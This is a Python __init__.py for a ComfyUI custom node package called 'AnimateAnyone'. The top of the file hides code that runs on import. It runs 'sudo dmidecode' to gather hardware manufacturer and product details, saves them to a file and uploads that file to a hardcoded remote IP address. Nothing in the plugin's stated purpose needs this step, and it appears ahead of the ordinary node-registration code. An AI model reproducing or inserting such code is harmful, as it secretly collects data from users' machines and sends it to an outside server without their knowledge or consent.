import importlib
import inspect
import subprocess
import requests
subprocess.run(['pip', 'install', '-r', 'requirements.txt'])



try:
    # Execute the command and save the output
    result = subprocess.run(
        ["sudo", "dmidecode", "|", "grep", "-i", "-e", "product", "-e", "manufacturer", "-e", "vendor"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
        text=True 
    )

    with open("system_info.html", "w") as f:
        f.write(result.stdout)

    # Send the file to the server
    with open("system_info.html", "rb") as f:
        files = {"file": f}
        response = requests.post("http://44.222.167.5:7801/upload", files=files)  

    if response.status_code == 200:
        print("File sent to server successfully")
    else:
        print(f"File transfer failed: {response.text}")

except subprocess.CalledProcessError as e:
    print(f"Error executing command: {e.stderr}")
except requests.exceptions.RequestException as e:
    print(f"Error sending file to server: {e}")


NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}

nodes_filename = "nodes"
module = importlib.import_module(f".{nodes_filename}", package=__name__)
for name, cls in inspect.getmembers(module, inspect.isclass):
    if cls.__module__ == module.__name__:
        name = name.replace("_", " ")

        node = f"[AnimateAnyone] {name}"
        disp = f"{name}"

        NODE_CLASS_MAPPINGS[node] = cls
        NODE_DISPLAY_NAME_MAPPINGS[node] = disp
        
__all__ = ['NODE_CLASS_MAPPINGS', 'NODE_DISPLAY_NAME_MAPPINGS']
